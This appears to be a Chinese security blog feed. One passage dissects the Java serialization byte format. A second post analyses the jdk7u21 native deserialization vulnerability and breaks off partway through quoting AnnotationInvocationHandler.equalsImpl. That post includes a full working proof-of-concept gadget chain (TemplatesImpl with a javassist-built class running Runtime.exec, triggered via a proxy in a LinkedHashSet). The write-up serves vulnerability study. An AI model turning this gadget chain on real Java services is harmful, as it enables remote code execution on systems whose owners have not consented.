class="line">AC ED</span><br><span class="line">// 流协议的版本</span><br><span class="line">00 05 </span><br><span class="line">// 代表后面的一块序列化的是对象</span><br><span class="line">73 </span><br><span class="line">// 标识对象类描述信息的开始</span><br><span class="line">72</span><br><span class="line">// 类全名的长度:19</span><br><span class="line">00 13</span><br><span class="line">// 类全名:com.just.demo2.User</span><br><span class="line">62 6F 6D 2E 6A 75 73 74 2E 64 65 6D 6F 32 55 73 65 72 </span><br><span class="line">// serialVersionUID值</span><br><span class="line">&lt;八个字节&gt;</span><br><span class="line">// 表示该对象实现的是Serializable接口</span><br><span class="line">02</span><br></pre></td></tr></table></figure><p>类字段结构关键的部分就是要注意基本类型的结构不需要后面标识类名的一部分。</p><p>基本类型字段的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;标识类型的一个字节&gt; &lt;字段名字的长度&gt; &lt;字段名字&gt;</span><br></pre></td></tr></table></figure><p>而引用类型会多后面一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;标识引用类型的一个字节L: 0x4C&gt; &lt;字段名字的长度&gt; &lt;字段名字&gt; &lt;TC_STRING: 0x74&gt; &lt;字段类型全类名的长度&gt; &lt;字段类型全类名&gt;</span><br></pre></td></tr></table></figure><p>示例二的具体分析如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">// 表示这个对象序列化了三个字段</span><br><span class="line">00 03</span><br><span class="line">===第一个字段的信息===</span><br><span class="line">// 对应的字符是I，表示第一个字段是int类型的。</span><br><span class="line">49 </span><br><span class="line">// 表示这个字段的名字长度：3</span><br><span class="line">00 03</span><br><span class="line">// 这个字段的名字：age</span><br><span class="line">61 67 65</span><br><span class="line">===第二个字段的信息===</span><br><span class="line">// 对应的字符是L，表示第二个字段是引用类型的</span><br><span class="line">4C </span><br><span class="line">// 这个字段名字的长度：7</span><br><span class="line">00 07</span><br><span class="line">// 这个字段的名字：address</span><br><span class="line">61 64 64 72 73 73</span><br><span class="line">// 下一部分是字符串：TC_STRING</span><br><span class="line">// 这里的字符串标识的是这个字段的类名</span><br><span class="line">74</span><br><span class="line">// 字符串的长度: 24</span><br><span class="line">00 18</span><br><span class="line">// 字符串：Lcom/just/demo2/Address;</span><br><span class="line">4C 63 ...... 73 73 3B </span><br><span class="line">===第三个字段的信息===</span><br><span class="line">// 对应的字符是L，表示第三个字段是引用类型的，和上一个字段结构是一样的</span><br><span class="line">4C</span><br><span class="line">// 这个字段名字的长度为4</span><br><span class="line">00 04</span><br><span class="line">// 这个字段的名字：name</span><br><span class="line">6E 61 6D 65</span><br><span class="line">// TC_STRING</span><br><span class="line">74</span><br><span class="line">// 字符串的长度</span><br><span class="line">00 12</span><br><span class="line">// 字符串</span><br><span class="line">Ljava/lang/String;</span><br><span class="line">===结束部分===</span><br><span class="line">// TC_ENDBLOCKDATA，表示这一块内容的结束</span><br><span class="line">78</span><br><span class="line">// TC_NULL，表示这个类没有父类</span><br><span class="line">70 </span><br><span class="line">===字段对应的值===</span><br><span class="line">// 第一个字段是int类型的，占四个字节，这里值为21</span><br><span class="line">00 00 00 15</span><br><span class="line">// 第二个字段是引用类型的，需要用一个对象描述块，因此需要用TC_OBJECT来标识其开始</span><br><span class="line">73</span><br><span class="line">// TC_CLASSDESC：类描述信息的开始</span><br><span class="line">72</span><br><span class="line">// 类全名的长度: 24</span><br><span class="line">00 16</span><br><span class="line">// 类全名: com.just.demo2.Address</span><br><span class="line">63 6F ...... 73 73</span><br><span class="line">// 8个字节的serialVersionUID</span><br><span class="line">......</span><br><span class="line">// SC_SERIALIZABLE: 标识这个类实现了Serializable接口</span><br><span class="line">02</span><br><span class="line">// 属性的数量</span><br><span class="line">00 01</span><br><span class="line">// 引用类型L</span><br><span class="line">4C</span><br><span class="line">// 属性名字的长度</span><br><span class="line">00 04</span><br><span class="line">// 属性名字：name</span><br><span class="line">70 61 74 68</span><br></pre></td></tr></table></figure><p>接下来的是一个关键。</p><p><code>71</code> 表示 <code>TC_REFERENCE</code> 。</p><p><img src="/imgs/Pasted%20image%2020240301233516.png"></p><p>根据注释我们可以知道，这个标识的作用是引用已经写入序列化流中的对象类名，以免多次写入同一个类的类名导致序列化的结构的内容有没必要的部分。</p><p><code>TC_REFERENCE</code> 标记之后，是一个整数 <code>Int</code> 类型的数据，也就是说它占四个字节，它生成的基数是<code>00 7E 00 00</code> （ <code>baseWireHandle</code> 常量）。</p><p><img src="/imgs/Pasted%20image%2020240301234518.png"><br>这个数据减去 <code>baseWireHandle</code> 常量的值再加一表示的是这个引用是在序列化流中的第几个声明过的。比如这里是 <code>00 7E 00 02</code> ，就说明这个引用的是第三个声明的类（ <code>java.lang.String</code> ）。可以在使用第一个工具的时候发现其在声明每个类的时候已经标注了其的 <code>handle</code> 信息。</p><blockquote><p>关于这里 <code>handle</code> 的定义说的更清楚一些：一个写入字节流的对象都会被赋予引用 <code>Handle</code>，并且这个引用 <code>Handle</code> 可以反向引用该对象（使用 <code>TC_REFERENCE</code> 结构，引用前面 <code>handle</code> 的值），引用 <code>Handle</code> 会从 <code>0x7E0000</code> 开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用 <code>Handle</code> 会重新从 <code>0x7E0000</code> 开始。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240301235134.png"></p><p><img src="/imgs/Pasted%20image%2020240301235919.png"></p><p>然后就是常规的 <code>78</code> （ <code>TC_ENDBLOCKDATA</code> ），<code>70</code> （ <code>TC_NULL</code> ）。最后就是两个字段的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// TC_STRING</span><br><span class="line">74</span><br><span class="line">// 字符串的长度</span><br><span class="line">00 05</span><br><span class="line">// 字符串: wuhan</span><br><span class="line">77 75 68 61 74</span><br><span class="line">// TC_STRING</span><br><span class="line">74</span><br><span class="line">// 字符串的长度</span><br><span class="line">00 03</span><br><span class="line">// 字符串: tom</span><br><span class="line">74 6F 6D</span><br></pre></td></tr></table></figure><h2 id="示例三"><a href="#示例三" class="headerlink" title="示例三"></a>示例三</h2><p>最后看个 <code>java</code> 反序列化漏洞中常用的 <code>TemplatesImpl</code> 类来序列化分析分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">TemplatesImpl</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;<span class="string">&quot;demo&quot;</span>.getBytes()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;demo3.ser&quot;</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(templatesImpl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240302004051.png"></p><p>这里比较长，就只分析和前面不同的地方。</p><p>首先看到 <code>serialVersionUID</code> 的下一个部分，这里是 <code>03</code> 。</p><p><img src="/imgs/Pasted%20image%2020240302012702.png"></p><p><code>03</code> 在 <code>ObjectStreamConstants</code> 中找不到直接的对应，它其实是 <code>SC_WRITE_METHOD | SC_SERIALIZABLE</code> 的结果，表示这个类重写了 <code>writeObject()</code> 并且实现了 <code>Serializable</code> 接口。这也就是说，如果一个类满足多个 <code>SC_XXXX</code> ，那这一位应该是这些 <code>|</code> 后的结果。这在使用 <code>SerializationDumper</code> 工具的时候也可以看出来。</p><p><img src="/imgs/Pasted%20image%2020240302013025.png"><br><img src="/imgs/Pasted%20image%2020240302013221.png"></p><p>然后就是 <code>9</code> 个序列化了的字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int(49) _indentNumber</span><br><span class="line">int(49) _transletIndex</span><br><span class="line">boolean(5A) _useServicesMechanism</span><br><span class="line">Ljava/lang/String; _accessExternalStylesheet</span><br><span class="line">Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable; _auxClasses</span><br><span class="line">// 这个后面单独讲</span><br><span class="line">[[B _bytecodes</span><br><span class="line">[Ljava/lang/Class; _class</span><br><span class="line">// 这个也单独后面讲</span><br><span class="line">Ljava/lang/String; _name</span><br><span class="line">Ljava/util/Properties; _outputProperties</span><br></pre></td></tr></table></figure><p>第六个字段 <code>_bytecodes</code> 比较特殊，是 <code>byte[][]</code> 类型的。</p><p><img src="/imgs/Pasted%20image%2020240302014915.png">关注蓝色这个部分。</p><p>首先是 <code>5B</code> 表示这个字段是数组类型的。然后是末尾的 <code>5B 5B 42</code> ，其中两个 <code>5B</code> 表示这是二维数组，<code>42</code> 表示是 <code>byte</code> 类型的。</p><p>第七个字段 <code>_class</code> 也是类似的。开头的 <code>5B</code> 表示这个字段是数组类型的，末尾是一个 <code>5B</code> 开头的，说明其是一维数组，然后后面跟的就是其数组存放的元素类型。</p><blockquote><p>这里可能会感觉有点问题，当字段是数组时，开头的标识都是 <code>5B</code> ，那怎么区分末尾的元素类型是基本类型还是引用类型的呢。这里我猜可能是通过根据引用类型的开头是 <code>L</code> 来区分的，这可能就是引用类型需要 <code>L</code> 开头的原因。</p></blockquote><p>倒数第二个字段也比较特殊，不过前面在示例二中提到了。这里用到了反向引用 <code>TC_REFERENCE</code> （ <code>0x71</code> ），后面跟的 <code>00 7e 00 01</code> 相对 <code>baseWireHandle</code> 的偏移是 <code>1</code> ，说明其引用的是第二个流中声明过的引用类型，也就对应的是 <code>Ljava/lang/String;</code> 。</p><p><img src="/imgs/Pasted%20image%2020240302020917.png"></p><p><img src="/imgs/Pasted%20image%2020240302020855.png"></p><p>然后依次是 <code>9</code> 个字段的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// int: 0</span><br><span class="line">00 00 00 00</span><br><span class="line">// int: -1</span><br><span class="line">FF FF FF FF</span><br><span class="line">// boolean: false</span><br><span class="line">00</span><br><span class="line">// String: &quot;all&quot;</span><br><span class="line">74 00 03 61 6C 6C</span><br><span class="line">// Hashtable: null</span><br><span class="line">70(TC_NULL)</span><br><span class="line">// 后面的比较特殊单独讲</span><br></pre></td></tr></table></figure><p>然后就是一个新的标识： <code>TC_ARRAY</code> （ <code>0x75</code> ）。表示后面需要序列化的是一个数组。然后是紧跟着 <code>TC_CLASSDESC</code> 。</p><p><img src="/imgs/Pasted%20image%2020240302021729.png"></p><p>然后 <code>00 03</code> 是类名的长度， <code>5B 5B 42</code> 是类名 <code>[[B</code> ，表示 <code>byte[][]</code> 。然后是八个字节的 <code>serialVersionUID</code> ，然后是 <code>SC_SERIALIZABLE</code> ，然后是 <code>00 00</code> 表示这个类有 <code>0</code> 个字段（如果是 <code>TC_ARRAY</code> 数组类型，貌似这里都是 <code>00 00</code> ，毕竟数组也不是个真的类，没有验证过，感兴趣的可以试试）。由于没有字段，然后就是 <code>TC_ENDBLOCKDATA</code> ， <code>TC_NULL</code> ，然后 <code>00 00 00 01</code> 表示二维数组的第二维的长度为 <code>1</code> 。</p><p>然后继续是开启内层的一维数组描述字节 <code>TC_ARRAY</code> ，<code>TC_CLASSDESC</code> 。然后 <code>00 02</code> 表示类名长度，<code>5B 42</code> 表示类名 <code>[B</code> ，即一维字节数组。然后继续是八个字节的 <code>serialVersionUID</code> ，然后是 <code>SC_SERIALIZABLE</code> 。依旧是  <code>00 00</code> 表示这个类有 <code>0</code> 个字段。然后是 <code>TC_ENDBLOCKDATA</code> ， <code>TC_NULL</code> ，然后 <code>00 00 00 04</code> 表示一维数组的长度为 <code>4</code> ，也就对应示例代码中的 <code>&quot;demo&quot;</code> 字符串 。然后就是 <code>&quot;demo&quot;</code> 字符串本身了（ <code>64 65 6D 6F</code> ）。</p><p>这里就结束了这个二维字节数组字段（ <code>_bytecodes</code> ）的序列化。然后是下一个字段的值，是 <code>TC_NULL</code> （ <code>70</code> ），说明下个字段（ <code>_class</code> ）为 <code>null</code> 。</p><p>然后是 <code>_name</code> 字段的值 <code>&quot;test&quot;</code> 。</p><p>然后最后一个字段 <code>_outputProperties</code> 的值还是 <code>TC_NULL</code> 。</p><p>后面又是一个新的点，<code>77</code> 表示 <code>TC_BLOCKDATA</code> ，后面跟着的第一个字节表示再后一部分的长度，这里是 <code>01</code> 。然后再后一部分 <code>00</code> 表示 <code>false</code> 。最后以 <code>TC_ENDBLOCKDATA</code> 结尾。这一块其实按照常理是不存在的，这里的存在是因为 <code>TemplatesImpl</code> 类重写了 <code>writeObject()</code> 方法。在默认的序列化流程之后还调用了 <code>writeBoolean()</code> 方法。这一块的格式就是序列化 <code>Boolean</code> 数据时的格式。</p><p><img src="/imgs/Pasted%20image%2020240302025832.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里只是抛砖引玉来说明序列化的大致结构。更加细节的需要结合参考官方文档，源码和 <code>SerializationDumper</code> 工具来分析。这里基本上就能看得懂七七八八的了。后面给出一些标识的参考。</p><p><img src="/imgs/Pasted%20image%2020240302030140.png"></p><p><img src="/imgs/Pasted%20image%2020240302030155.png"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/silentbalanceyh/article/details/8183849">https://blog.csdn.net/silentbalanceyh/article/details/8183849</a><br><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jdk7u21和jdk8u20原生反序列化漏洞分析</title>
      <link href="/2024/03/02/jdk7u21%E5%92%8Cjdk8u20%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/02/jdk7u21%E5%92%8Cjdk8u20%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="环境jdk下载地址"><a href="#环境jdk下载地址" class="headerlink" title="环境jdk下载地址"></a>环境jdk下载地址</h1><p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a><br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><h1 id="jdk7u21反序列化"><a href="#jdk7u21反序列化" class="headerlink" title="jdk7u21反序列化"></a>jdk7u21反序列化</h1><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.just.Util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jdk7u21的poc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload.toBytecode()&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化一个map，并添加f5a5a608为key，value先随便设置一个值</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;clyyy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为tempHandler创造实现类对象</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(poc1.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line"></span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);<span class="comment">//这个顺序非常重要，不能反着来哈</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span> []o = serialize(set);</span><br><span class="line"></span><br><span class="line">        unserialize(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>漏洞的关键触发利用点在 <code>AnnotationInvocationHandler.equalsImpl(Object var1)</code> 方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取动态代理类的所有方法</span></span><br><span class="line">Method[] var2 = <span class="built_in">this</span>.getMemberMethods();</span><br><span class="line"><span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">    <span class="comment">// 遍历当前动态代理原本对象的所有方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];</span><br><span class="line"><span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();</span><br><span class="line"><span class="comment">// 根据当前方法的名字从memberValues（Map类型）中获取对应的values</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);</span><br><span class="line"><span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 判断var1是否是一个动态代理的对象，如果是就返回其InvocationHandler，反之返回null</span></span><br><span class="line"><span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);</span><br><span class="line"><span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">var8 = var9.memberValues.get(var6);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//调用var1对象的方法，获取返回值</span></span><br><span class="line">var8 = 